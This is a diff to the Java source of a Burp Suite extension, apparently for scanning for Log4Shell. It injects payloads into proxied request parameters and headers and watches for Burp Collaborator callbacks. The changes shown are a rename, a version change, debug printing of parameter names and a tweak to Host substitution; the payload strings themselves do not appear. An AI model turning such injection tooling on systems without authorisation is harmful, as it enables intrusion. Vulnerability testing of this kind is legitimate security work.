@@ -6,8 +6,8 @@ import java.text.SimpleDateFormat;
 import java.util.*;
 
 public class BurpExtender implements IBurpExtender {
-    private static final String name = "MY log4shell Everywhere";
-    private static final String version = "1.1";
+    private static final String name = "myLog4shell Everywhere";
+    private static final String version = "0.4";
 
     // provides potentially useful info but increases memory usage
     static final boolean SAVE_RESPONSES = false;
@@ -16,6 +16,7 @@ public class BurpExtender implements IBurpExtender {
     @Override
     public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
         new Utilities(callbacks);
+
         callbacks.setExtensionName(name);
 
         Correlator collab = new Correlator();
@@ -27,8 +28,11 @@ public class BurpExtender implements IBurpExtender {
         callbacks.registerProxyListener(new Injector(collab));
 
         Utilities.out("Loaded " + name + " v" + version);
+
     }
 }
+
+
 
 class Monitor implements Runnable, IExtensionStateListener {
     private Correlator collab;
@@ -58,7 +62,8 @@ class Monitor implements Runnable, IExtensionStateListener {
             Utilities.out("Error fetching/handling interactions: "+e.getMessage());
         }
 
-        Utilities.out("Shutting down collaborator monitor thread");
+        Utilities.out("Shutting down collaborator monitor thread.");
+
     }
 
     private void processInteraction(IBurpCollaboratorInteraction interaction) {
@@ -276,12 +281,19 @@ class Injector implements IProxyListener {
         //request = Utilities.replaceRequestLine(request, "GET @"+collabId + "/"+collabId.split("[.]")[0] + " HTTP/1.1");
         //request = Utilities.addOrReplaceHeader(request, "Referer", "http://portswigger-labs.net/redirect.php?url=https://portswigger-labs.net/"+collabId);
 
+        IRequestInfo requestInfo = Utilities.helpers.analyzeRequest(request);
+        List<IParameter> parameterList = requestInfo.getParameters();
+        for (IParameter parameter : parameterList) {
+            Utilities.out(parameter.getName());
+
+        }
+
         request = Utilities.addOrReplaceHeader(request, "Cache-Control", "no-transform");
 
         for (String[] injection: injectionPoints) {
             String payload = injection[2].replace("%s", collab.generateCollabId(requestCode, injection[1]));
-	    // replace %h with corresponding Host header (same as with %s for Collaborator)
-	    payload = payload.replace("%h", Utilities.getHeader(request, "Host"));
+	        // replace %h with corresponding Host header (same as with %s for Collaborator)
+            payload = payload.replace("%h", Utilities.getHeader(request, "Host").split(":")[0]);
             switch ( injection[0] ){
                 case "param":
                     IParameter param = Utilities.helpers.buildParameter(injection[1], payload, IParameter.PARAM_URL);
